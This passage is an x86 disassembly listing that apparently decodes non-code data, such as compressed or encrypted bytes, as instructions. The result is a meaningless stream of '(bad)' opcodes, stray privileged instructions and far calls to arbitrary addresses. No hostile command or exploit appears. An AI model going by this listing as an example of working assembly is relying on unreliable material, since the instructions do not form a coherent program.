  41cbf2:	xchg   DWORD PTR [ecx+0x360f0247],ebx
  41cbf8:	push   ss
  41cbf9:	push   eax
  41cbfa:	xor    BYTE PTR [ecx],ch
  41cbfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbfd:	xchg   DWORD PTR [eax+0x17a97ae8],eax
  41cc03:	ja     0x41cbe1
  41cc05:	cmp    eax,0x6e4e8070
  41cc0a:	cmp    BYTE PTR [ebx],bh
  41cc0c:	mov    al,0x19
  41cc0e:	pop    es
  41cc0f:	pop    ds
  41cc10:	jg     0x41cc19
  41cc12:	pushf  
  41cc13:	sub    dh,BYTE PTR [ebx+eiz*1+0x55]
  41cc17:	loope  0x41cc8f
  41cc19:	mov    ch,0x4b
  41cc1b:	call   0x3d7a:0x19db5c5
  41cc22:	lahf   
  41cc23:	or     bh,BYTE PTR [ecx-0x19470cf4]
  41cc29:	xor    ch,BYTE PTR [eax+0x7f]
  41cc2c:	mov    eax,ds:0x978468b6
  41cc31:	mov    dl,0xdc
  41cc33:	mov    ch,BYTE PTR [esi]
  41cc35:	aas    
  41cc36:	pop    edi
  41cc37:	shr    BYTE PTR [ecx],0x38
  41cc3a:	or     esp,esp
  41cc3c:	ins    BYTE PTR es:[edi],dx
  41cc3d:	popa   
  41cc3e:	addr16 cmc 
  41cc40:	mov    DWORD PTR [esi-0x538e70a2],edi
  41cc46:	mov    edx,0x38d8cf55
  41cc4b:	sbb    ah,BYTE PTR [eax+0x3e]
  41cc4e:	in     eax,0x8c
  41cc50:	mov    gs,WORD PTR [edx+0x54b9b89f]
  41cc56:	es inc ecx
  41cc58:	push   0xfffffff2
  41cc5a:	loope  0x41cc5a
  41cc5c:	jg     0x41cbf5
  41cc5e:	push   esp
  41cc5f:	dec    esp
  41cc60:	pop    ds
  41cc61:	push   ecx
  41cc62:	aam    0x16
  41cc64:	inc    ebx
  41cc65:	mov    esp,0x625dfe67
  41cc6a:	add    DWORD PTR [ecx+0x57f97f6f],esp
  41cc70:	add    BYTE PTR [edi-0x65da4488],dh
  41cc76:	(bad)  
  41cc77:	lahf   
  41cc78:	div    eax
  41cc7a:	ds aam 0xbc
  41cc7d:	fstp   DWORD PTR [ebx-0x12]
  41cc80:	mov    ebx,0x9466400c
  41cc85:	int3   
  41cc86:	dec    esi
  41cc87:	shr    DWORD PTR [eax-0x47],0xe7
  41cc8b:	mov    eax,ds:0xf7a7adbe
  41cc90:	adc    BYTE PTR [ecx+0x30],al
  41cc93:	ins    BYTE PTR es:[edi],dx
  41cc94:	push   ss
  41cc95:	cmc    
  41cc96:	lds    ebp,FWORD PTR [ecx]
  41cc98:	test   DWORD PTR [edi+0x2e],ecx
  41cc9b:	scas   eax,DWORD PTR es:[edi]
  41cc9c:	cwde   
  41cc9d:	xor    ebx,DWORD PTR [eax-0x3f048836]
  41cca3:	mov    ch,0xec
  41cca5:	fsubr  st,st(0)
  41cca7:	jne    0x41cc91
  41cca9:	add    cl,BYTE PTR [edi]
  41ccab:	ret    
  41ccac:	add    eax,0x2fc8f4bd
  41ccb1:	mov    al,0x83
  41ccb3:	jge    0x41cd0d
  41ccb5:	nop
  41ccb6:	fmulp  st(2),st
  41ccb8:	sbb    DWORD PTR [ebp+0xb],esi
  41ccbb:	sar    DWORD PTR [ebx-0x52],0x59
  41ccbf:	ss cmc 
  41ccc1:	test   eax,0x7e91ed73
  41ccc6:	dec    edi
  41ccc7:	xor    DWORD PTR [ecx-0x23],eax
  41ccca:	js     0x41cd47
  41cccc:	loop   0x41cd22
  41ccce:	pop    esp
  41cccf:	(bad)  [esi-0x31]
  41ccd2:	mov    al,ds:0xfd5fac19
  41ccd7:	xlat   BYTE PTR ds:[ebx]
  41ccd8:	icebp  
  41ccd9:	cdq    
  41ccda:	retf   0xede
  41ccdd:	jno    0x41ccd8
  41ccdf:	in     al,dx
  41cce0:	dec    ecx
  41cce1:	lahf   
  41cce2:	stc    
  41cce3:	shr    DWORD PTR [eax+0x35],cl
  41cce6:	je     0x41cce9
  41cce8:	sbb    edx,esi
  41ccea:	add    al,0x8c
  41ccec:	shl    BYTE PTR [edx-0x2e],cl
  41ccef:	or     eax,0x3b3b7717
  41ccf4:	mov    eax,0x6e48536
  41ccf9:	sbb    al,0xed
  41ccfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccfc:	jmp    0x41ccca
  41ccfe:	je     0x41cd58
  41cd00:	shl    DWORD PTR [edi],1
  41cd02:	pop    esi
  41cd03:	hlt    
  41cd04:	call   0x10e:0x54451f88
  41cd0b:	stc    
  41cd0c:	cmp    eax,DWORD PTR [ebx+0x6f]
  41cd0f:	iret   
  41cd10:	add    DWORD PTR [ecx+0x40],edx
  41cd13:	mov    eax,0xd48425d
  41cd18:	jo     0x41cd17
  41cd1a:	shr    DWORD PTR [ecx],1
  41cd1c:	mov    ds:0xb41f5735,eax
  41cd21:	or     DWORD PTR [eax+0x13],eax
  41cd24:	sbb    ecx,0x27
  41cd27:	ins    BYTE PTR es:[edi],dx
  41cd28:	dec    edx
  41cd29:	cs jle 0x41cd13
  41cd2c:	add    BYTE PTR [edx],ah
  41cd2e:	adc    eax,0xfbf16f18
  41cd33:	sbb    al,0x56
  41cd35:	ja     0x41ccf7
  41cd37:	mov    ch,0x39
  41cd39:	cmc    
  41cd3a:	gs cmp cl,cl
  41cd3d:	adc    eax,0x28b72ba8
  41cd42:	sub    BYTE PTR [edx+0x78093139],bl
  41cd48:	shr    BYTE PTR [esi-0x7830d091],cl
  41cd4e:	enter  0x669d,0xed
  41cd52:	xor    al,0x23
  41cd54:	mov    esi,0xe58205eb
  41cd59:	push   0xffffff91
  41cd5b:	xor    bl,dh
  41cd5d:	stc    
  41cd5e:	rcl    DWORD PTR [edi+0x7a4792ce],0xe5
  41cd65:	or     dl,BYTE PTR [esi]
  41cd67:	xor    BYTE PTR [ecx],bh
  41cd69:	cdq    
  41cd6a:	jge    0x41cd5d
  41cd6c:	std    
  41cd6d:	mov    WORD PTR [ecx+0x66],?
  41cd70:	xchg   ecx,ebp
  41cd72:	ret    
  41cd73:	sub    dl,BYTE PTR ds:0xc9ae196
  41cd79:	dec    edx
  41cd7a:	xchg   ebp,eax
  41cd7b:	daa    
  41cd7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd7d:	les    edx,FWORD PTR [edi+0x4d]
  41cd80:	push   cs
  41cd81:	leave  
  41cd82:	das    
  41cd83:	add    DWORD PTR ds:0xa1d3539,ebx
  41cd89:	dec    ebp
  41cd8a:	outs   dx,DWORD PTR ds:[esi]
  41cd8b:	pop    ecx
  41cd8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd8d:	mov    eax,0x3ccd3f2
  41cd92:	jp     0x41cd65
  41cd94:	shl    ebp,cl
  41cd96:	inc    ebp
  41cd97:	popf   
  41cd98:	sub    bh,al
  41cd9a:	es jge 0x41cdb7
  41cd9d:	xor    BYTE PTR [eax],bh
  41cd9f:	xor    bl,BYTE PTR [esi]
  41cda1:	pop    es
  41cda2:	lea    esi,[ecx+eax*1-0x65]
  41cda6:	pop    ds
  41cda7:	dec    ebp
  41cda8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cda9:	mov    cs,WORD PTR [eax+0x79]
  41cdac:	cmp    DWORD PTR [esi+0x14ffb629],edi
  41cdb2:	cmp    eax,0x2ac49387
  41cdb7:	ins    BYTE PTR es:[edi],dx
  41cdb8:	mov    ebp,0x3c12ee52
  41cdbd:	mov    eax,0x876d95ac
  41cdc2:	add    ch,0xde
  41cdc5:	fwait
  41cdc6:	dec    esi
  41cdc7:	in     eax,0x61
  41cdc9:	mov    ds,WORD PTR [ebx+0x74]
  41cdcc:	and    cl,dh
  41cdce:	push   ebx
  41cdcf:	sub    ebx,DWORD PTR [ecx-0xab2be49]
  41cdd5:	jle    0x41ce35
  41cdd7:	push   es
  41cdd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdd9:	push   esp
  41cdda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cddb:	in     eax,dx
  41cddc:	and    ebx,DWORD PTR [eax+0x453eff30]
  41cde2:	inc    esi
  41cde3:	mov    BYTE PTR [eax],ah
  41cde5:	push   edi
  41cde6:	not    BYTE PTR [edx+0x24]
  41cde9:	inc    edx
  41cdea:	into   
  41cdeb:	xchg   esp,eax
  41cdec:	and    edi,ebx
  41cdee:	ret    
  41cdef:	mov    bl,0x4e
  41cdf1:	jp     0x41cdac
  41cdf3:	xchg   edx,eax
  41cdf4:	add    BYTE PTR [edx],dh
  41cdf6:	ins    BYTE PTR es:[edi],dx
  41cdf7:	dec    ebx
  41cdf8:	in     eax,0xff
  41cdfa:	lods   al,BYTE PTR ds:[esi]
  41cdfb:	add    BYTE PTR [edx-0x1355280e],dl
  41ce01:	idiv   BYTE PTR [esi+ebx*4+0x7f]
  41ce05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce06:	cmc    
  41ce07:	cli    
  41ce08:	cdq    
  41ce09:	popa   
  41ce0a:	jbe    0x41ce0d
  41ce0c:	and    BYTE PTR [edi+0x2f],dl
  41ce0f:	test   al,0x92
  41ce11:	inc    esp
  41ce12:	push   esi
  41ce13:	pop    eax
  41ce14:	mov    esi,0x685f474c
  41ce19:	mov    cl,0xcc
  41ce1b:	pushf  
  41ce1c:	aaa    
  41ce1d:	add    ebx,DWORD PTR [edi]
  41ce1f:	inc    eax
  41ce20:	cmp    cl,BYTE PTR [ebp+0x5e77a21c]
  41ce26:	mov    eax,ds:0x68c2d22b
  41ce2b:	sub    dh,BYTE PTR [edi+0x4b07f18e]
  41ce31:	imul   edi,edi,0x6f21e2a7
  41ce37:	fisub  DWORD PTR [edx]
  41ce39:	mov    ah,0x11
  41ce3b:	add    al,0x5
  41ce3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce3e:	cmp    al,0x7f
  41ce40:	adc    ch,bh
  41ce42:	ret    
  41ce43:	and    al,0x2e
  41ce45:	mov    ebp,DWORD PTR [eax-0x602dd950]
  41ce4b:	rcl    BYTE PTR [edx-0x49ece0a5],0xc0
  41ce52:	inc    ebx
  41ce53:	jp     0x41ce59
  41ce55:	(bad)  
  41ce56:	out    dx,eax
  41ce57:	mov    WORD PTR ss:[ecx+0x7bd9769c],?
  41ce5e:	or     esp,eax
  41ce60:	mov    al,ds:0x5f109adb
  41ce65:	add    BYTE PTR [edx+edi*2],ch
  41ce68:	(bad)  
  41ce6a:	jmp    0x41cec6
  41ce6c:	pop    ds
  41ce6d:	mov    fs,ecx
  41ce6f:	stc    
  41ce70:	cmp    DWORD PTR [ebx],ecx
  41ce72:	shr    BYTE PTR [eax],1
  41ce74:	sub    DWORD PTR [ebx+0x71],ebx
  41ce77:	dec    edx
  41ce78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce79:	not    BYTE PTR [edi]
  41ce7b:	mov    bl,0x1d
  41ce7d:	sbb    DWORD PTR [ebx],edx
  41ce7f:	dec    eax
  41ce80:	test   BYTE PTR [eax],cl
  41ce82:	inc    edx
  41ce83:	int3   
  41ce84:	test   BYTE PTR [ebx-0x692c887e],bl
  41ce8a:	aaa    
  41ce8b:	imul   esp,DWORD PTR [ebp+0x7785c4a8],0xffffffb7
  41ce92:	jo     0x41cecf
  41ce94:	cld    
  41ce95:	stc    
  41ce96:	imul   ebp,DWORD PTR [edi-0x46],0xffffffc8
  41ce9a:	outs   dx,BYTE PTR ds:[esi]
  41ce9b:	inc    eax
  41ce9c:	int    0x94
  41ce9e:	je     0x41cf13
  41cea0:	fld    QWORD PTR [ebp-0x55767765]
  41cea6:	jp     0x41cec4
  41cea8:	mov    BYTE PTR [ecx],dh
  41ceaa:	lea    edi,[ecx+eiz*4]
  41cead:	and    eax,0xe12e544d
  41ceb2:	dec    ebp
  41ceb3:	xchg   edi,eax
  41ceb4:	xchg   dl,bh
  41ceb6:	out    dx,al
  41ceb7:	mov    cs,WORD PTR [ebp+ecx*8+0xaa4f918]
  41cebe:	shl    BYTE PTR [ecx],0x70
  41cec1:	xor    eax,0x5bb5b160
  41cec6:	mov    WORD PTR [ebx-0x69],gs
  41cec9:	xchg   ebx,eax
  41ceca:	js     0x41ceb6
  41cecc:	ins    BYTE PTR es:[edi],dx
  41cecd:	lds    esp,FWORD PTR [ecx+0x66bd143a]
  41ced3:	test   eax,0x97a14836
  41ced8:	in     eax,0xa8
  41ceda:	sbb    eax,0xab7052ab
  41cedf:	frstor [edx+0x6c]
  41cee2:	jae    0x41cec1
  41cee4:	(bad)  
  41cee5:	ins    DWORD PTR es:[edi],dx
  41cee6:	mov    ds:0xa86b08d6,eax
  41ceeb:	aas    
  41ceec:	jle    0x41cf67
  41ceee:	dec    ecx
  41ceef:	inc    esp
  41cef0:	(bad)  
  41cef1:	pushf  
  41cef2:	or     ah,BYTE PTR [edi]
  41cef4:	or     al,0x91
  41cef6:	popa   
  41cef7:	gs popf 
  41cef9:	fimul  WORD PTR [ebp+0x36]
  41cefc:	sahf   
  41cefd:	push   ebp
  41cefe:	(bad)  
  41cf00:	jbe    0x41cf4c
  41cf02:	cwde   
  41cf03:	das    
  41cf04:	or     BYTE PTR [ecx+0x75],bl
  41cf07:	sub    eax,DWORD PTR [ebx-0x1b]
  41cf0a:	jg     0x41cf41
  41cf0c:	fwait
  41cf0d:	and    esp,DWORD PTR [edi+0x12]
  41cf10:	mov    ebp,0xd09d8e47
  41cf15:	jo     0x41cf0f
  41cf17:	je     0x41cf6d
  41cf19:	dec    ecx
  41cf1a:	jmp    0x41cf84
  41cf1c:	xchg   ebp,eax
  41cf1d:	(bad)  
  41cf1e:	jmp    0x85db4063
  41cf23:	stos   BYTE PTR es:[edi],al
  41cf24:	and    ebp,DWORD PTR [ebp-0xfd54e8a]
  41cf2a:	aaa    
  41cf2b:	mov    al,0x2e
  41cf2d:	or     eax,0x6092c858
  41cf32:	or     eax,0x82057182
  41cf37:	cdq    
  41cf38:	jmp    0x41cf91
  41cf3a:	xor    ch,al
  41cf3c:	ja     0x41ceda
  41cf3e:	sub    dh,BYTE PTR [ecx+0xc]
  41cf41:	mov    ebp,DWORD PTR [edx-0x6ae62a8f]
  41cf47:	fisubr WORD PTR [esi+0x1abbbea4]
  41cf4d:	push   ecx
  41cf4e:	clc    
  41cf4f:	push   ebp
  41cf50:	push   cs
  41cf51:	xchg   edx,eax
  41cf52:	and    eax,0x68f8f8
  41cf57:	jnp    0x41cfcd
  41cf59:	add    eax,DWORD PTR [ebx+0xe]
  41cf5c:	xchg   ebp,eax
  41cf5d:	call   0x973f:0xa26dd869
  41cf64:	mov    al,0xf6
  41cf66:	jmp    0x41cfa1
  41cf68:	fadd   st(3),st
  41cf6a:	mov    ch,0x75
  41cf6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf6d:	mov    esp,DWORD PTR [esi]
  41cf6f:	mov    edx,0x6866d1c1
  41cf74:	cmp    DWORD PTR [ecx],0x68
  41cf77:	sbb    BYTE PTR [ebx-0x6b14e69e],dl
  41cf7d:	imul   ecx,DWORD PTR [ebx],0xffffff90
  41cf80:	daa    
  41cf81:	fwait
  41cf82:	xchg   edx,eax
  41cf83:	cli    
  41cf84:	pop    esp
  41cf85:	out    dx,al
  41cf86:	(bad)  
  41cf87:	cwde   
  41cf88:	adc    DWORD PTR [edi],ebp
  41cf8a:	add    dl,bh
  41cf8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf8d:	das    
  41cf8e:	mov    eax,ds:0x4a529f1b
  41cf93:	aas    
  41cf94:	jns    0x41cf56
  41cf96:	sbb    eax,0x434afdbb
  41cf9b:	sti    
  41cf9c:	repnz leave 
  41cf9e:	es gs inc ebx
  41cfa1:	shl    al,0x15
  41cfa4:	or     DWORD PTR [ebx+0x1fcfdd8f],0x45
  41cfab:	adc    eax,0x3d368759
  41cfb0:	push   es
  41cfb1:	cdq    
  41cfb2:	sub    bh,bh
  41cfb4:	loopne 0x41cfac
  41cfb6:	aad    0x52
  41cfb8:	scas   al,BYTE PTR es:[edi]
  41cfb9:	rcl    DWORD PTR [ecx-0x25a93017],1
  41cfbf:	sahf   
  41cfc0:	jl     0x41cff8
  41cfc2:	mov    edi,0xa820ac6b
  41cfc7:	mov    DWORD PTR [esi+0x7d],esi
  41cfca:	xchg   ebx,eax
  41cfcb:	call   0x9ce:0xeb69ecd
  41cfd2:	mov    esi,0xcc2d9997
  41cfd7:	push   edx
  41cfd8:	adc    eax,0x20
  41cfdb:	mov    bh,dh
  41cfdd:	sbb    bh,cl
  41cfdf:	xchg   DWORD PTR [eax+0x27d6a2e9],ecx
  41cfe5:	mov    al,0x5a
  41cfe7:	pusha  
  41cfe8:	addr16 aas 
  41cfea:	loope  0x41d04b
  41cfec:	add    al,0xf4
  41cfee:	leave  
  41cfef:	xor    DWORD PTR ds:[eax+0x6a],ebx
  41cff3:	adc    eax,0x889d83eb
  41cff8:	push   0xac8f662e
  41cffd:	add    edx,DWORD PTR [ecx-0x8]
  41d000:	jne    0x41cfbb
  41d002:	mov    ds:0x57c4bb13,al
  41d007:	lahf   
  41d008:	fs cwde 
  41d00a:	dec    eax
  41d00b:	xlat   BYTE PTR ds:[ebx]
  41d00c:	retf   0xaddf
  41d00f:	jnp    0x41cfee
  41d011:	sbb    ebp,DWORD PTR [edi]
  41d013:	jne    0x41d08d
  41d015:	out    dx,al
  41d016:	mov    ebx,0x3b06d49f
  41d01b:	cld    
  41d01c:	pusha  
  41d01d:	add    ah,BYTE PTR [esi-0x6e]
  41d020:	f2xm1  
  41d022:	pusha  
  41d023:	inc    edi
  41d024:	cdq    
  41d025:	loop   0x41d01a
  41d027:	ret    0x365d
  41d02a:	loope  0x41cfad
  41d02c:	or     eax,0x6347cd89
  41d031:	add    eax,0xdb858324
  41d036:	jge    0x41cfbc
  41d038:	cs sub esi,ebp
  41d03b:	call   0xb705:0x1d0e940f
  41d042:	scas   al,BYTE PTR es:[edi]
  41d043:	call   0x98b8:0x2c790651
  41d04a:	stos   BYTE PTR es:[edi],al
  41d04b:	sub    cl,BYTE PTR [edi+0x7c385487]
  41d051:	jecxz  0x41d07d
  41d053:	(bad)  
  41d054:	std    
  41d055:	scas   eax,DWORD PTR es:[edi]
  41d056:	bound  eax,QWORD PTR [eax+esi*2-0x6f07f45a]
  41d05d:	aad    0x73
  41d05f:	and    edi,DWORD PTR [ebx-0x2bc7b84e]
  41d065:	cmp    eax,0x2c406a43
  41d06a:	jl     0x41d03c
  41d06c:	dec    edx
  41d06d:	ds mov ecx,0xaaa9e038
  41d073:	stc    
  41d074:	fsub   QWORD PTR [esi+0x1cf03888]
  41d07a:	adc    al,0x4e
  41d07c:	ds iret 
  41d07e:	mov    dh,0x60
  41d080:	les    ebx,FWORD PTR [ebp-0x18]
  41d083:	xor    al,0xc
  41d085:	fst    st(3)
  41d087:	push   ds
  41d088:	inc    edx
  41d089:	hlt    
  41d08a:	sub    DWORD PTR [edi-0x24c1a9a],eax
  41d090:	rcr    DWORD PTR cs:[edi+0x1],0x60
  41d095:	aaa    
  41d096:	mul    ebx
  41d098:	push   edx
  41d099:	mov    bl,0xaa
  41d09b:	xchg   ebp,eax
  41d09c:	clc    
  41d09d:	pop    ebp
  41d09e:	mov    edi,0xb7741e76
  41d0a3:	xchg   ebx,eax
  41d0a4:	mov    WORD PTR [esi],?
  41d0a6:	cmp    al,0xc9
  41d0a8:	(bad)  
  41d0a9:	jnp    0x41d08c
  41d0ab:	scas   al,BYTE PTR es:[edi]
  41d0ac:	adc    BYTE PTR [eax+0x246dd003],al
  41d0b2:	inc    al
  41d0b4:	fisttp QWORD PTR [edx]
  41d0b6:	dec    edx
  41d0b7:	pop    ebx
  41d0b8:	gs xchg edx,eax
  41d0ba:	in     al,0x7f
  41d0bc:	out    0x27,eax
  41d0be:	(bad)  [ecx]
  41d0c0:	mov    esi,0x7192d6e2
  41d0c5:	fild   QWORD PTR [edi+0x53b75be4]
  41d0cb:	clc    
  41d0cc:	fnstsw WORD PTR [ebx+ebp*2]
  41d0cf:	mov    al,ds:0x94307b1b
  41d0d4:	ret    
  41d0d5:	lds    esi,FWORD PTR ds:0xac7907d5
  41d0db:	jb     0x41d0ae
  41d0dd:	icebp  
  41d0de:	inc    esi
  41d0df:	jae    0x41d072
  41d0e1:	mov    edx,0xdc114027
  41d0e6:	mov    ebp,DWORD PTR [eax]
  41d0e8:	adc    al,0x11
  41d0ea:	test   eax,0x952534bf
  41d0ef:	call   0x39dc0e73
  41d0f4:	(bad)  
  41d0f5:	div    cl
  41d0f7:	int3   
  41d0f8:	jae    0x41d170
  41d0fa:	(bad)
  41d0fd:	sar    BYTE PTR [eax-0x2b],cl
  41d100:	imul   edi,DWORD PTR [edx+0xaed3483],0x52
  41d107:	scas   eax,DWORD PTR es:[edi]
  41d108:	mov    al,0x4a
  41d10a:	ret    
  41d10b:	mov    ebx,0x6f6cfd3c
  41d110:	dec    esp
  41d111:	stc    
  41d112:	cmp    bl,BYTE PTR ds:0xfbcb0246
  41d118:	xlat   BYTE PTR ds:[ebx]
  41d119:	test   DWORD PTR [eax+0x66c1919e],ecx
  41d11f:	add    al,0x57
  41d121:	push   esi
  41d122:	test   DWORD PTR ds:0x25b54674,0x1a9bbe4b
  41d12c:	and    dl,BYTE PTR [edi-0x5d]
  41d12f:	jp     0x41d0cd
  41d131:	cli    
  41d132:	xchg   ebx,eax
  41d133:	mov    ebp,0xdd84fdb9
  41d138:	add    BYTE PTR [ebx],0xf4
  41d13b:	dec    esi
  41d13c:	sub    ecx,ecx
  41d13e:	push   0x702d56e8
  41d143:	dec    ebp
  41d144:	loopne 0x41d166
  41d146:	add    DWORD PTR [esi+0x34],esp
  41d149:	out    0x72,eax
  41d14b:	aam    0xa
  41d14d:	outs   dx,DWORD PTR ds:[esi]
  41d14e:	or     eax,0x7824845c
  41d153:	xchg   esi,eax
  41d154:	or     al,0x5e
  41d156:	and    eax,0x2c039f3e
  41d15b:	and    cl,ch
  41d15d:	or     ch,BYTE PTR [esi]
  41d15f:	in     eax,dx
  41d160:	in     al,0x1d
  41d162:	pusha  
  41d163:	inc    edi
  41d164:	push   ds
  41d165:	and    al,0xb7
  41d167:	pusha  
  41d168:	inc    ecx
  41d169:	in     eax,0x6a
  41d16b:	xor    eax,DWORD PTR [eax-0x7d]
  41d16e:	dec    ebp
  41d16f:	div    BYTE PTR [edi+0x34149f46]
  41d175:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d176:	les    esi,FWORD PTR [edi]
  41d178:	shr    DWORD PTR [edx],1
  41d17a:	xor    al,0x3a
  41d17c:	fld    TBYTE PTR [ecx]
  41d17e:	rol    BYTE PTR [esp+edx*4+0x73],cl
  41d182:	pop    ebx
  41d183:	(bad)  
  41d184:	add    eax,DWORD PTR [ecx+0x1d3a9798]
  41d18a:	leave  
  41d18b:	sub    eax,esi
  41d18d:	fwait
  41d18e:	inc    ebp
  41d18f:	fisttp QWORD PTR [ecx+0x4]
  41d192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d193:	fild   DWORD PTR [ebp+edx*8-0x3c]
  41d197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d198:	fadd   QWORD PTR [esi-0x47]
  41d19b:	jmp    0xd3d72482
  41d1a0:	shr    BYTE PTR [ecx-0x12],cl
  41d1a3:	sahf   
  41d1a4:	rol    DWORD PTR [edi-0x20fab15f],1
  41d1aa:	cmp    DWORD PTR [eax+0x59],esp
  41d1ad:	int3   
  41d1ae:	lods   al,BYTE PTR ds:[esi]
  41d1af:	pop    eax
  41d1b0:	sub    dh,bl
  41d1b2:	xor    al,BYTE PTR [esi-0x4497c8a5]
  41d1b8:	rcr    BYTE PTR [ebx],cl
  41d1ba:	stc    
  41d1bb:	jno    0x41d140
  41d1bd:	and    BYTE PTR [edx+edi*1+0x706b5d00],ch
  41d1c4:	imul   esi,ebx,0xffffffc2
  41d1c7:	loop   0x41d200
  41d1c9:	or     dl,BYTE PTR [ecx+esi*2]
  41d1cc:	lea    edi,[ecx-0x50]
  41d1cf:	push   ecx
  41d1d0:	js     0x41d230
  41d1d2:	loopne 0x41d171
  41d1d4:	test   BYTE PTR [ecx],ah
  41d1d6:	jno    0x41d15d
  41d1d8:	push   ebx
  41d1d9:	lahf   
  41d1da:	and    DWORD PTR [eax+0x2a8a581c],edi
  41d1e0:	das    
  41d1e1:	cmp    BYTE PTR [edx-0x5d],dl
  41d1e4:	inc    esp
  41d1e5:	std    
  41d1e6:	repnz test eax,0xf5a4f843
  41d1ec:	push   es
  41d1ed:	push   0xffffffdc
  41d1ef:	xchg   esp,eax
  41d1f0:	pop    ds
  41d1f1:	xchg   edi,eax
  41d1f2:	inc    ecx
  41d1f3:	pop    ebx
  41d1f4:	mov    ah,0x6
  41d1f6:	cmovno edx,DWORD PTR ds:0xc34c90d6
  41d1fd:	push   ss
  41d1fe:	inc    ecx
  41d1ff:	outs   dx,BYTE PTR ds:[esi]
  41d200:	imul   ebp,DWORD PTR [ecx-0x52],0xffffff9a
  41d204:	dec    ebx
  41d205:	cwde   
  41d206:	sbb    esi,0xfffffffe
  41d209:	xchg   ecx,eax
  41d20a:	push   ecx
  41d20b:	int    0x6a
  41d20d:	cmc    
  41d20e:	inc    edx
  41d20f:	cmp    al,0x5f
  41d211:	(bad)  
  41d212:	jmp    0x9e47:0x8540237
  41d219:	shl    BYTE PTR [ecx+0x3a791e9b],1
  41d21f:	out    dx,eax
  41d220:	test   BYTE PTR [esp+eiz*2+0x71],bh
  41d224:	les    eax,FWORD PTR [ebp+0x2a]
  41d227:	mov    dh,0xcc
  41d229:	sub    eax,0x96fdd579
  41d22e:	mov    ah,0x69
  41d230:	ret    
  41d231:	repz repz xchg edx,eax
  41d234:	outs   dx,DWORD PTR ds:[esi]
  41d235:	imul   ebx,esi,0xfc82b4c
  41d23b:	addr16 dec eax
  41d23d:	sub    eax,0xc6a449cc
  41d242:	sbb    esp,ebp
  41d244:	leave  
  41d245:	fadd   DWORD PTR [edi+0x5c]
  41d248:	mov    ds:0x9ff2745b,eax
  41d24d:	or     BYTE PTR [edi-0x7eab4736],bh
  41d253:	out    dx,al
  41d254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d255:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d256:	mov    ah,0x7a
  41d258:	push   ds
  41d259:	stos   BYTE PTR es:[edi],al
  41d25a:	xchg   edi,eax
  41d25b:	push   cs
  41d25c:	adc    BYTE PTR [edx],dl
  41d25e:	jnp    0x41d2ca
  41d260:	sub    al,0x1e
  41d262:	mov    cl,0xa3
  41d264:	mov    bh,0x62
  41d266:	xchg   ebx,eax
  41d267:	xor    ecx,ecx
  41d269:	sub    eax,0xade14930
  41d26e:	dec    esp
  41d26f:	pop    ebx
  41d270:	loopne 0x41d282
  41d272:	xchg   edi,eax
  41d273:	jno    0x41d2f3
  41d275:	and    BYTE PTR [esi-0x50],ch
  41d278:	jne    0x41d28a
  41d27a:	pusha  
  41d27b:	inc    ebx
  41d27c:	xchg   BYTE PTR [edx],ch
  41d27e:	in     al,0x38
  41d280:	mov    WORD PTR [ecx+0x5e],es
  41d283:	das    
  41d284:	jne    0x41d2ff
  41d286:	mov    dh,0x95
  41d288:	jmp    0x41d2ff
  41d28a:	xor    al,0xcf
  41d28c:	mov    al,ds:0x50ca5d4c
  41d291:	adc    DWORD PTR ds:0x9092bf48,edi
  41d297:	dec    edx
  41d298:	jle    0x41d2df
  41d29a:	lock and BYTE PTR [esi],al
  41d29d:	adc    al,0x8c
  41d29f:	scas   eax,DWORD PTR es:[edi]
  41d2a0:	push   0xfffffff8
  41d2a2:	or     DWORD PTR [edi-0x77],ebx
  41d2a5:	inc    esp
  41d2a6:	cmp    al,0xe4
  41d2a8:	xchg   esi,eax
  41d2a9:	in     al,dx
  41d2aa:	xchg   ebp,eax
  41d2ab:	push   ecx
  41d2ac:	mov    ebx,esp
  41d2ae:	(bad)  
  41d2af:	ror    BYTE PTR [ebp-0x1d],cl
  41d2b2:	jg     0x41d294
  41d2b4:	ja     0x41d2d4
  41d2b6:	mov    ds,WORD PTR [edi]
  41d2b8:	int3   
  41d2b9:	sbb    ecx,edi
  41d2bb:	test   BYTE PTR [edx+0x5af839c8],0x63
  41d2c2:	fs inc ecx
  41d2c4:	jge    0x41d24d
  41d2c6:	aam    0xa0
  41d2c8:	dec    ecx
  41d2c9:	ret    
  41d2ca:	mov    al,ds:0xcc28b63d
  41d2cf:	cmp    ch,BYTE PTR [edi]
  41d2d1:	stc    
  41d2d2:	hlt    
  41d2d3:	jo     0x41d2ca
  41d2d5:	test   esi,esi
  41d2d7:	inc    edi
  41d2d8:	rol    DWORD PTR [ebx+eax*2+0x7d],1
  41d2dc:	fimul  DWORD PTR [ecx]
  41d2de:	xchg   ebp,eax
  41d2df:	dec    esp
  41d2e0:	push   0xaccbaea9
  41d2e5:	xchg   ebx,eax
  41d2e6:	push   0xc
  41d2e8:	sbb    BYTE PTR [ecx+0x392868f3],0x51
  41d2ef:	or     esi,DWORD PTR [edx]
  41d2f1:	jns    0x41d2cb
  41d2f3:	gs gs inc eax
  41d2f6:	nop
  41d2f7:	xchg   edi,eax
  41d2f8:	popa   
  41d2f9:	lods   al,BYTE PTR ds:[esi]
  41d2fa:	xchg   edx,eax
  41d2fb:	mov    edi,0xac573843
  41d300:	push   0x1a2216a3
  41d305:	jmp    0x8353:0x1944dfd5
  41d30c:	mov    bl,0xb4
  41d30e:	cli    
